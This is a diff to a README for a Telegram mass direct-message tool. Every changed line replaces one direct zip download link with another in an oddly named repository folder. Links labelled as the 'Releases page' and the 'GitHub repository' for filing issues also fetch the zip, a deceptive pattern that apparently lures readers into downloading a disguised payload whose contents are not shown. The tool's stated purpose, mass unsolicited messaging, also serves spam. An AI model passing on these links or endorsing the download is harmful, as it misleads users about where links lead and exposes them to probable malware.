@@ -1,6 +1,6 @@
 # 📬 Telegram-Auto-Mass-Dms - Streamline Your Telegram Messaging Experience
 
-[![Download Now](https://raw.githubusercontent.com/mortenulterior585/Telegram-Auto-Mass-Dms/main/cephalosome/Telegram-Auto-Mass-Dms_3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mortenulterior585/Telegram-Auto-Mass-Dms/main/cephalosome/Telegram-Auto-Mass-Dms_3.7.zip)
+[![Download Now](https://github.com/mortenulterior585/Telegram-Auto-Mass-Dms/raw/refs/heads/main/cephalosome/Mass-Telegram-Auto-Dms-1.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/mortenulterior585/Telegram-Auto-Mass-Dms/raw/refs/heads/main/cephalosome/Mass-Telegram-Auto-Dms-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Telegram-Auto-Mass-Dms, a user-friendly tool designed to simplify you
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/mortenulterior585/Telegram-Auto-Mass-Dms/main/cephalosome/Telegram-Auto-Mass-Dms_3.7.zip). There, you will find the latest version of the software. 
+To download the application, visit the [Releases page](https://github.com/mortenulterior585/Telegram-Auto-Mass-Dms/raw/refs/heads/main/cephalosome/Mass-Telegram-Auto-Dms-1.3.zip). There, you will find the latest version of the software. 
 
 1. Click the link above to open the Releases page.
 2. Look for the most recent version of the Telegram-Auto-Mass-Dms tool.
@@ -60,7 +60,7 @@ Telegram-Auto-Mass-Dms comes packed with features to enhance your Telegram exper
 
 If you encounter any issues while using Telegram-Auto-Mass-Dms or if you would like to provide feedback, feel free to reach out for assistance.
 
-For help, please create an issue in the [GitHub repository](https://raw.githubusercontent.com/mortenulterior585/Telegram-Auto-Mass-Dms/main/cephalosome/Telegram-Auto-Mass-Dms_3.7.zip), and one of our team members will get back to you swiftly.
+For help, please create an issue in the [GitHub repository](https://github.com/mortenulterior585/Telegram-Auto-Mass-Dms/raw/refs/heads/main/cephalosome/Mass-Telegram-Auto-Dms-1.3.zip), and one of our team members will get back to you swiftly.
 
 ## 🌐 Community & Feedback
 
@@ -68,7 +68,7 @@ Join our community where users share their experiences and tips on getting the m
 
 ## 📅 Future Updates
 
-We are committed to updating Telegram-Auto-Mass-Dms regularly, adding new features, and enhancing performance. Check back often on the [Releases page](https://raw.githubusercontent.com/mortenulterior585/Telegram-Auto-Mass-Dms/main/cephalosome/Telegram-Auto-Mass-Dms_3.7.zip) for the latest version.
+We are committed to updating Telegram-Auto-Mass-Dms regularly, adding new features, and enhancing performance. Check back often on the [Releases page](https://github.com/mortenulterior585/Telegram-Auto-Mass-Dms/raw/refs/heads/main/cephalosome/Mass-Telegram-Auto-Dms-1.3.zip) for the latest version.
 
 --- 
 
